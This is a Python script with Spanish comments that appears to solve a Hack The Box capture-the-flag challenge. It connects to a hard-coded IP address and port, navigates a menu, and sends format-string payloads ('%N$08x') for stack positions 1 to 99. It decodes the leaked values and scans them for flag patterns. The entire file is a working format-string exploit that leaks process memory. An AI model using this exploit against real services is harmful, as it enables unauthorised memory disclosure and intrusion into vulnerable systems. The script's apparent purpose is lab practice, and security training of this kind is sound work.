#!/usr/bin/env python3

import socket
import time

def connect_and_read_stack_position(pos):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect(('94.237.57.211', 45459))
        
        # Recibir menú
        data = s.recv(4096)
        
        # Enviar selección
        s.send(b"0\n")
        
        # Recibir confirmación
        data = s.recv(4096)
        
        # Enviar format string
        payload = f"%{pos}$08x"
        s.send((payload + "\n").encode())
        
        # Recibir respuesta
        data = s.recv(4096).decode()
        
        # Extraer resultado
        if "[Description]" in data:
            result = data.split("[Description]")[1].strip()
            return result
        
        s.close()
        return None
        
    except Exception as e:
        return None

def hex_to_ascii(hex_str):
    try:
        if len(hex_str) != 8:
            return ""
        bytes_val = bytes.fromhex(hex_str)
        bytes_val = bytes_val[::-1]  # Little endian
        ascii_val = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in bytes_val)
        return ascii_val
    except:
        return ""

def main():
    print("Leyendo stack sistemáticamente...")
    
    interesting_strings = []
    
    for pos in range(1, 100):
        result = connect_and_read_stack_position(pos)
        if result:
            ascii_val = hex_to_ascii(result)
            print(f"Pos {pos:2d}: {result} -> '{ascii_val}'")
            
            # Buscar patrones interesantes
            if any(pattern in ascii_val.lower() for pattern in ['htb', 'flag', '{', '}', 'ctf']):
                print(f"*** PATRÓN INTERESANTE EN POSICIÓN {pos}: '{ascii_val}' ***")
                interesting_strings.append((pos, result, ascii_val))
            
            # También buscar en el hex
            if any(pattern in result.lower() for pattern in ['48544', '666c61', '7b', '7d']):  # HTB, flag, {, }
                print(f"*** PATRÓN HEX INTERESANTE EN POSICIÓN {pos}: {result} ***")
                interesting_strings.append((pos, result, ascii_val))
        
        time.sleep(0.1)
    
    if interesting_strings:
        print("\n=== STRINGS INTERESANTES ENCONTRADOS ===")
        for pos, hex_val, ascii_val in interesting_strings:
            print(f"Posición {pos}: {hex_val} -> '{ascii_val}'")
    else:
        print("\nNo se encontraron patrones obvios de flag.")

if __name__ == "__main__":
    main()